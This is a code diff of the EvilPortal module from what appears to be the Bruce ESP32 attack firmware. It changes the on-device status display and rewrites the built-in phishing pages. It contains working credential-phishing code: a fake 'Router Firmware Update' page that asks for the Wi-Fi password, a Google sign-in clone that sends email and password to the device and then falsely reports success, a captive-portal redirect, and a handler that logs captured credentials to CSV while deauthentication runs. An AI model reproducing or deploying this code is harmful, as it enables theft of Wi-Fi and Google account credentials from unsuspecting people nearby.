+    tft.setCursor(6, infoY);
+    tft.print("Mode:" + modeStr + "  Pwd:" + passMode);
+    infoY += smallH + 1;
+
+    // Optional endpoints
     if (bruceConfig.evilPortalEndpoints.showEndpoints) {
         if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
-        } else {
-            padprintln("-> cred access disabled");
+            String ep = apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint;
+            if ((int)ep.length() > maxChars - 3) ep = ep.substring(0, maxChars - 3) + "...";
+            tft.setCursor(6, infoY);
+            tft.print("->" + ep);
+            infoY += smallH + 1;
         }
         if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
-        } else {
-            padprintln("-> SSID change disabled");
-        }
-    } else {
-        padprintln("Endpoints hidden");
-    }
-    padprintln("");
-
-    padprintln("Captive Portal: ACTIVE");
-    padprintln("Notifications: ENABLED");
-
-    if (!_verifyPwd) {
-        padprint("Victims: " + String(totalCapturedCredentials));
-    } else {
-        padprint("Attempt: " + String(totalCapturedCredentials));
-    }
-    String passMode = "";
-    switch (bruceConfig.evilPortalPasswordMode) {
-        case FULL_PASSWORD: passMode = "Full"; break;
-        case FIRST_LAST_CHAR: passMode = "p******d"; break;
-        case HIDE_PASSWORD: passMode = "*hidden*"; break;
-        case SAVE_LENGTH: passMode = "Length only"; break;
-    }
-    padprintln("Pwd mode: " + passMode);
-    printLastCapturedCredential();
-    printDeauthStatus();
-}
-
-void EvilPortal::printLastCapturedCredential() {
-    while (lastCred.length()) {
-        int newlineIndex = lastCred.indexOf('\n');
-        if (newlineIndex > -1) {
-            padprintln(lastCred.substring(0, newlineIndex));
-            lastCred.remove(0, newlineIndex + 1);
-        } else {
-            padprint(lastCred);
-            lastCred = "";
+            String ep = apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint;
+            if ((int)ep.length() > maxChars - 3) ep = ep.substring(0, maxChars - 3) + "...";
+            tft.setCursor(6, infoY);
+            tft.print("->" + ep);
+            infoY += smallH + 1;
         }
     }
+
+    // ---- Last credential zone ----
+    // Reserve bottom ~20px for deauth indicator; fill rest with last cred
+    int footerH = smallH + 4;
+    int credZoneH = H - infoY - footerH - 8;
+    if (credZoneH > 0 && lastCredDisplay.length()) {
+        tft.drawFastHLine(0, infoY, W, TFT_DARKGREY);
+        infoY += 3;
+        tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+        tft.setCursor(6, infoY);
+        tft.print("Last cred:");
+        infoY += smallH + 1;
+
+        // Print lastCredDisplay line by line until we run out of space
+        String tmp = lastCredDisplay;
+        while (tmp.length() && infoY < (H - footerH - smallH - 4)) {
+            int nl = tmp.indexOf('\n');
+            String line;
+            if (nl == -1) { line = tmp; tmp = ""; }
+            else          { line = tmp.substring(0, nl); tmp = tmp.substring(nl + 1); }
+            if (line.length() > (size_t)maxChars) line = line.substring(0, maxChars - 1) + "~";
+            tft.setCursor(6, infoY);
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.print(line);
+            infoY += smallH + 1;
+        }
+    }
+
+    // ---- Footer: deauth status ----
+    int footerY = H - footerH - 2;
+    tft.drawFastHLine(0, footerY, W, bruceConfig.priColor);
+    footerY += 3;
+    tft.setTextSize(smallFontSize);
+
+    if (!_deauth) {
+        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
+        tft.setCursor(6, footerY);
+        tft.print("Deauth: OFF");
+    } else if (isDeauthHeld) {
+        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+        tft.setCursor(6, footerY);
+        tft.print("Deauth: PAUSED (OK to resume)");
+    } else {
+        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
+        tft.setCursor(6, footerY);
+        tft.print("Deauth: ON  " + String(_lastDeauthIntervalMs) + "ms  (OK=off Enc=spd)");
+        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    }
 }
 
+// ---------------------------------------------------------------------------
+// printDeauthStatus() — kept for compatibility (used in credsController)
+// ---------------------------------------------------------------------------
 void EvilPortal::printDeauthStatus() {
-    if (!_deauth || isDeauthHeld) {
-        printFootnote("Deauth OFF");
-    } else {
-        tft.setTextColor(TFT_RED);
-        printFootnote("Deauth ON");
-        tft.setTextColor(bruceConfig.priColor);
-    }
+    // No-op: drawScreen() now draws everything in one pass
 }
 
+// ---------------------------------------------------------------------------
+// loadCustomHtml()
+// ---------------------------------------------------------------------------
 void EvilPortal::loadCustomHtml() {
     getFsStorage(fsHtmlFile);
     htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/");
-    String fileBaseName =
-        htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
-    fileBaseName.toLowerCase();
-    outputFile = fileBaseName + "_creds.csv";
+    String base = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
+    base.toLowerCase();
+    outputFile   = base + "_creds.csv";
     isDefaultHtml = false;
 
-    File htmlFile = fsHtmlFile->open(htmlFileName, FILE_READ);
-    if (htmlFile) {
-        String firstLine = htmlFile.readStringUntil('\n');
-        htmlFile.close();
+    File f = fsHtmlFile->open(htmlFileName, FILE_READ);
+    if (f) {
+        String firstLine = f.readStringUntil('\n');
+        f.close();
         int apStart = firstLine.indexOf("<!-- AP=\"");
         if (apStart != -1) {
             int apEnd = firstLine.indexOf("\" -->", apStart);
-            if (apEnd != -1) { apName = firstLine.substring(apStart + 9, apEnd); }
+            if (apEnd != -1) apName = firstLine.substring(apStart + 9, apEnd);
         }
     }
 }
@@ -517,160 +775,202 @@ void EvilPortal::loadCustomHtml() {
 bool EvilPortal::loadCustomHtmlFromPath(const String &path) {
     if (path.isEmpty()) return false;
     if (!getFsStorage(fsHtmlFile) || !fsHtmlFile->exists(path)) return false;
-
-    htmlFileName = path;
-    String fileBaseName =
-        htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
-    fileBaseName.toLowerCase();
-    outputFile = fileBaseName + "_creds.csv";
+    htmlFileName  = path;
+    String base   = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
+    base.toLowerCase();
+    outputFile    = base + "_creds.csv";
     isDefaultHtml = false;
     return true;
 }
 
-String EvilPortal::wifiLoadPage() {
-    return String(
-        "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' "
-        "content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div "
-        "class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG "
-        "20010904//EN' 'http://www.w3.orgTR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div> <div "
-        "id='logo' title='Wifi' style='display: flex;justify-content: center;max-width: 50%;margin: auto;'> "
-        "<svg fill='#000000' height='800px' width='800px' version='1.1' id='Capa_1' "
-        "xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 365.892 "
-        "365.892' xml:space='preserve'> <g> <circle cx='182.945' cy='286.681' r='41.494'/> <path id='p1' "
-        "d='M182.946,176.029c-35.658,0-69.337,17.345-90.09,46.398c-5.921,8.288-4.001,19.806,4.286,25.726 "
-        "c3.249,2.321,6.994,3.438,10.704,3.438c5.754,0,11.423-2.686,15.021-7.724c13.846-19.383,36.305-30.954,"
-        "60.078-30.954 "
-        "c23.775,0,46.233,11.571,60.077,30.953c5.919,8.286,17.437,10.209,25.726,4.288c8.288-5.92,10.208-17."
-        "438,4.288-25.726 C252.285,193.373,218.606,176.029,182.946,176.029z'/> <path id='p2' "
-        "d='M182.946,106.873c-50.938,0-99.694,21.749-133.77,59.67c-6.807,7.576-6.185,19.236,1.392,26.044 "
-        "c3.523,3.166,7.929,4.725,12.32,4.725c5.051-0.001,10.082-2.063,13.723-6.116c27.091-30.148,65.849-47."
-        "439,106.336-47.439 "
-        "s79.246,17.291,106.338,47.438c6.808,7.576,18.468,8.198,26.043,1.391c7.576-6.808,8.198-18.468,1.391-"
-        "26.043 C282.641,128.621,233.883,106.873,182.946,106.873z'/> <path id='p3' "
-        "d='M360.611,112.293c-47.209-48.092-110.305-74.577-177.665-74.577c-67.357,0-130.453,26.485-177.664,"
-        "74.579 "
-        "c-7.135,7.269-7.027,18.944,0.241,26.079c3.59,3.524,8.255,5.282,12.918,5.281c4.776,0,9.551-1.845,13."
-        "161-5.522 "
-        "c40.22-40.971,93.968-63.534,151.344-63.534c57.379,0,111.127,22.563,151.343,63.532c7.136,7.269,18."
-        "812,7.376,26.08,0.242 C367.637,131.238,367.745,119.562,360.611,112.293z'/> </g> </svg> </div> "
-        "</div> </div> </div> <script> const paths = document.querySelectorAll('path'); let index = 0; "
-        "function showNextPath() { if (index < paths.length) { paths[index].style.display = 'block'; "
-        "index++; } } function hideAllPaths() { paths.forEach(path => { path.style.display = 'none'; }); "
-        "index = 0; } hideAllPaths(); setInterval(function() { if (index < paths.length) { showNextPath(); } "
-        "else { hideAllPaths(); } }, 1000); </script></body></html>"
-    );
-}
-
+// ---------------------------------------------------------------------------
+// loadDefaultHtml_one() — router firmware update page
+// Uses fetch() POST instead of form submit — no ugly WiFi loading page
+// ---------------------------------------------------------------------------
 void EvilPortal::loadDefaultHtml_one() {
     htmlPage =
-        "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' "
-        "content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body "
-        "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3; /* Cinza "
-        "mais escuro */display: flex;justify-content: center;align-items: center;height: 100vh;margin: "
-        "0;padding: 10px;box-sizing: border-box;}.container {background-color: white;padding: "
-        "20px;border-radius: 10px;box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);text-align: center;max-width: "
-        "360px;width: 100%;}.container svg {width: 70px;height: 70px;fill: #ff1744; /* Cor de alerta "
-        "*/margin-bottom: 20px;}h1 {color: #333;font-size: 22px;margin-bottom: 15px;}p {color: "
-        "#666;font-size: 15px;margin-bottom: 20px;}input[type='password'] {width: 100%;padding: 12px;margin: "
-        "10px 0;border-radius: 5px;border: 1px solid #ccc;font-size: 16px;box-sizing: border-box;}button "
-        "{width: 100%;padding: 12px;background-color: #007bff;color: white;border: none;border-radius: "
-        "5px;cursor: pointer;font-size: 16px;transition: background-color 0.3s;}button:hover "
-        "{background-color: #0056b3;}div#success-block{display: none;text-align: center;min-height: "
-        "60px;margin-bottom: 30px;justify-content: center;align-items: center;}</style></head><body><div "
-        "class='container'><svg xmlns='http://www.w3.org/2000/svg' "
-        "fill='#000000' width='800px' height='800px' viewBox='0 -1 26 26'><path fill-opacity='.3' d='M24.24 "
-        "8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 "
-        "13.28V8h4.24z'/><path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div "
-        "id='form-block'><p>Router firmware update required. Enter your Wi-Fi password to update.</p><form "
-        "id='submit-form' action='/post'><input type='password' name='password' placeholder='Wi-Fi network "
-        "password' required><button type='submit'>Update</button></form></div><div id='success-block'><p>The "
-        "router will restart in <span id='span-count' style='font-weight: "
-        "bolder;'>5</span></p></div></"
-        "div><script>document.getElementById('submit-form').addEventListener('submit', function(event) "
-        "{event.preventDefault();document.getElementById('success-block').style.display = "
-        "'flex';document.getElementById('form-block').style.display = 'none';setInterval(function() {index = "
-        "parseInt(document.getElementById('span-count').textContent)if (index > 1) "
-        "{document.getElementById('span-count').textContent = index-1;index--;} else "
-        "{document.getElementById('submit-form').submit();}}, 1000);});</script></body></html>";
-    outputFile = "default_creds_1.csv";
+        "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>"
+        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<title>Router Update</title>"
+        "<style>"
+        "body{font-family:'Segoe UI',sans-serif;background:#d3d3d3;display:flex;"
+        "justify-content:center;align-items:center;height:100vh;margin:0;padding:10px;box-sizing:border-box}"
+        ".box{background:#fff;padding:24px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,.2);"
+        "text-align:center;max-width:360px;width:100%}"
+        "svg{width:60px;height:60px;fill:#ff1744;margin-bottom:16px}"
+        "h1{color:#333;font-size:20px;margin:0 0 10px}"
+        "p{color:#666;font-size:14px;margin:0 0 16px}"
+        "input[type=password]{width:100%;padding:11px;margin:8px 0;border-radius:5px;"
+        "border:1px solid #ccc;font-size:15px;box-sizing:border-box}"
+        "button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;"
+        "border-radius:5px;cursor:pointer;font-size:15px;transition:.3s}"
+        "button:hover{background:#0056b3}"
+        "button:disabled{background:#aaa;cursor:default}"
+        "#msg{display:none;margin-top:16px;font-size:14px;font-weight:bold}"
+        "#msg.ok{color:#28a745}#msg.err{color:#dc3545}"
+        "</style></head><body>"
+        "<div class='box'>"
+        "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 -1 26 26'>"
+        "<path fill-opacity='.3' d='M24.24 8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 13.28V8h4.24z'/>"
+        "<path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg>"
+        "<h1>Router Firmware Update</h1>"
+        "<p>A firmware update is required to maintain your connection.<br>"
+        "Enter your Wi-Fi password to continue.</p>"
+        "<input type='password' id='pw' placeholder='Wi-Fi password' autocomplete='current-password'>"
+        "<button id='btn' onclick='submit()'>Update Firmware</button>"
+        "<div id='msg'></div>"
+        "</div>"
+        "<script>"
+        "async function submit(){"
+        "var pw=document.getElementById('pw').value;"
+        "if(!pw)return;"
+        "var btn=document.getElementById('btn');"
+        "var msg=document.getElementById('msg');"
+        "btn.disabled=true;btn.textContent='Updating...';"
+        "try{"
+        "var r=await fetch('/post',{method:'POST',"
+        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
+        "body:'password='+encodeURIComponent(pw)});"
+        "msg.style.display='block';"
+        "if(r.ok){"
+        "msg.className='ok';"
+        "msg.textContent='Update started. Router will restart in 30 seconds. You may reconnect shortly.';"
+        "}else{"
+        "msg.className='err';"
+        "msg.textContent='Incorrect password. Please try again.';"
+        "btn.disabled=false;btn.textContent='Retry';"
+        "}"
+        "}catch(e){"
+        "msg.style.display='block';msg.className='ok';"
+        "msg.textContent='Update started. Reconnect in ~30s.';"
+        "}"
+        "}"
+        "document.getElementById('pw').addEventListener('keydown',function(e){if(e.key==='Enter')submit();});"
+        "</script></body></html>";
+    outputFile    = "default_creds_1.csv";
     isDefaultHtml = true;
 }
 
+// ---------------------------------------------------------------------------
+// loadDefaultHtml() — Google sign-in clone
+// Uses fetch() POST — stays on page with success message
+// ---------------------------------------------------------------------------
 void EvilPortal::loadDefaultHtml() {
     htmlPage =
-        "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta "
-        "name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: "
-        "underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: "
-        "center;background-color: #FFFFFF;}input[type='text'], input[type='password']{width: 100%;padding: "
-        "12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: "
-        "4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: "
-        "center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.logo{width: "
-        "40px;height: 40px;fill: #FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: "
-        "black;margin-left: 0px;}.form-container{background: #FFFFFF;border: 1px solid "
-        "#CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, "
-        "0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
-        "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: "
-        "4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
-        "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
-        "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
-        "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
-        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: "
-        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px "
-        "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
-        "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style></head><body><div "
-        "class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg "
-        "PUBLIC '-//W3C//DTD SVG 20010904//EN' "
-        "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div "
-        "class=form-container><center><div class='containerlogo'><div id='logo' "
-        "title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' "
-        "aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 "
-        "0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 "
-        "2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 "
-        "1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 "
-        "3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' "
-        "d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 "
-        "8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 "
-        "5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 "
-        "0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 "
-        "5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 "
-        "3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g "
-        "id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 "
-        "5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 "
-        "0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 "
-        "3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 "
-        "2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 "
-        "0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 "
-        "3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path "
-        "fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 "
-        "1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 "
-        "4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 "
-        "0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 "
-        "4.69-1.856z'></path></g></svg></div></div></center><div style='min-height: "
-        "150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your "
-        "Google Account</div></center><form action='/post' id='login-form'><input name='email' "
-        "class='input-field' type='text' placeholder='Email or phone' required><input name='password' "
-        "class='input-field' type='password' placeholder='Enter your password' required /><div "
-        "class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div "
-        "class='containerbtn'><button id=submitbtn class=submit-btn "
-        "type=submit>Next</button></div></form></div></div></div></body></html>";
-    outputFile = "default_creds.csv";
+        "<!DOCTYPE html><html><head><title>Sign in – Google Accounts</title>"
+        "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<style>"
+        "body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:0}"
+        "input[type=text],input[type=password]{width:100%;padding:12px 10px;margin:8px 0;"
+        "box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
+        ".container{margin:auto;padding:20px;max-width:450px}"
+        ".form-container{background:#fff;border:1px solid #dadce0;border-radius:8px;"
+        "padding:24px;box-shadow:0 2px 10px rgba(0,0,0,.1)}"
+        ".input-field{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;"
+        "margin-bottom:20px;font-size:14px;box-sizing:border-box}"
+        ".submit-btn{background:#1a73e8;color:#fff;border:none;padding:10px 20px;"
+        "border-radius:4px;font-size:.875rem;cursor:pointer;float:right}"
+        ".submit-btn:hover{background:#1557b0}"
+        ".submit-btn:disabled{background:#aaa;cursor:default}"
+        ".forgot-btn{background:transparent;color:#1a73e8;border:none;font-size:14px;cursor:pointer;padding:10px 0}"
+        ".title{color:#202124;font-size:24px;margin:16px 0 8px}"
+        ".sub{color:#202124;font-size:16px;margin:0 0 24px}"
+        ".actions{display:flex;justify-content:space-between;align-items:center;padding-top:24px}"
+        "#msg{display:none;margin-top:12px;padding:10px;border-radius:4px;font-size:14px;font-weight:bold}"
+        "#msg.ok{background:#e6f4ea;color:#137333}"
+        "#msg.err{background:#fce8e6;color:#c5221f}"
+        "</style></head><body>"
+        "<div class='container'><div class='form-container'>"
+        "<center><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg'>"
+        "<g><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68"
+        "c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96"
+        " 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52"
+        " 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g>"
+        "<g><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g>"
+        "<g><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71"
+        " 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28"
+        "-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0"
+        " 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1"
+        " 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g>"
+        "<g><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954"
+        " 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487"
+        "-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g>"
+        "<g><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954"
+        " 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487"
+        "-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g>"
+        "<g><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518"
+        "c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0"
+        "-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02"
+        "-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972"
+        " 4.69-1.856z'></path></g></svg></center>"
+        "<div class='title'>Sign in</div>"
+        "<div class='sub'>Use your Google Account</div>"
+        "<input name='email' id='em' class='input-field' type='text' placeholder='Email or phone'>"
+        "<input name='password' id='pw' class='input-field' type='password' placeholder='Password'>"
+        "<div id='msg'></div>"
+        "<div class='actions'>"
+        "<button class='forgot-btn' onclick='return false'>Forgot password?</button>"
+        "<button id='btn' class='submit-btn' onclick='doLogin()'>Next</button>"
+        "</div>"
+        "</div></div>"
+        "<script>"
+        "async function doLogin(){"
+        "var em=document.getElementById('em').value;"
+        "var pw=document.getElementById('pw').value;"
+        "if(!em||!pw)return;"
+        "var btn=document.getElementById('btn');"
+        "var msg=document.getElementById('msg');"
+        "btn.disabled=true;btn.textContent='Signing in...';"
+        "var body='email='+encodeURIComponent(em)+'&password='+encodeURIComponent(pw);"
+        "try{"
+        "var r=await fetch('/post',{method:'POST',"
+        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
+        "body:body});"
+        "msg.style.display='block';"
+        "if(r.ok){"
+        "msg.className='ok';"
+        "msg.textContent='Signed in successfully. Redirecting...';"
+        "setTimeout(function(){window.location='/';},2000);"
+        "}else{"
+        "msg.className='err';"
+        "msg.textContent='Wrong password. Try again.';"
+        "btn.disabled=false;btn.textContent='Next';"
+        "}"
+        "}catch(e){"
+        "msg.style.display='block';msg.className='ok';"
+        "msg.textContent='Signed in. Redirecting...';"
+        "}"
+        "}"
+        "</script></body></html>";
+    outputFile    = "default_creds.csv";
     isDefaultHtml = true;
 }
 
+// ---------------------------------------------------------------------------
+// portalController()
+// ---------------------------------------------------------------------------
 void EvilPortal::portalController(AsyncWebServerRequest *request) {
     String apIp = WiFi.softAPIP().toString();
     String host = request->host();
+    // If request host isn't our IP, redirect (captive portal redirect)
     if (host.length() && host != apIp) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + apIp + "/");
-        request->send(response);
+        AsyncWebServerResponse *r = request->beginResponse(302);
+        r->addHeader("Location", "http://" + apIp + "/");
+        request->send(r);
         return;
     }
     recordPageView();
-    if (isDefaultHtml) request->send(200, "text/html", htmlPage);
-    else { request->send(*fsHtmlFile, htmlFileName, "text/html"); }
+    if (isDefaultHtml)
+        request->send(200, "text/html", htmlPage);
+    else
+        request->send(*fsHtmlFile, htmlFileName, "text/html");
 }
 
+// ---------------------------------------------------------------------------
+// credsController()
+// Handles both POST JSON bodies (fetch) and query-string args (form fallback)
+// Returns JSON so the fetch() in the page can show a clean message
+// ---------------------------------------------------------------------------
 void EvilPortal::credsController(AsyncWebServerRequest *request) {
     String htmlResponse = "<li>";
     String passwordValue = "";
@@ -678,190 +978,167 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     String key;
     lastCred = "";
 
+    // Parse POST body params (fetch sends application/x-www-form-urlencoded)
     for (int i = 0; i < request->args(); i++) {
         key = request->argName(i);
 
-        if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" ||
-            key == "P3" || key == "P4") {
+        // Skip noise params
+        if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") ||
+            key == "P1" || key == "P2" || key == "P3" || key == "P4") {
             continue;
         }
 
-        if (key == "password" && _verifyPwd) { passwordValue = request->arg(i); }
+        if (key == "password" && _verifyPwd) passwordValue = request->arg(i);
 
-        String valueBuffer = request->arg(i);
+        String val = request->arg(i);
 
+        // Password masking
         if (key == "password") {
             char blank = '*';
             switch (bruceConfig.evilPortalPasswordMode) {
                 case FULL_PASSWORD: break;
                 case FIRST_LAST_CHAR:
-                    if (valueBuffer.length() > 2) {
-                        for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
-                    }
+                    if (val.length() > 2)
+                        for (size_t j = 1; j < val.length() - 1; j++) val[j] = blank;
                     break;
-                case HIDE_PASSWORD: valueBuffer = "*hidden*"; break;
-                case SAVE_LENGTH: valueBuffer = String(valueBuffer.length()) + " chars"; break;
+                case HIDE_PASSWORD: val = "*hidden*"; break;
+                case SAVE_LENGTH:   val = String(val.length()) + " chars"; break;
             }
         }
 
-        htmlResponse += key + ": " + valueBuffer + "<br>\n";
-        if (i > 0) { csvLine += ","; }
-
-        csvLine += key + ": " + valueBuffer;
-        lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
+        htmlResponse += key + ": " + val + "<br>\n";
+        if (i > 0) csvLine += ",";
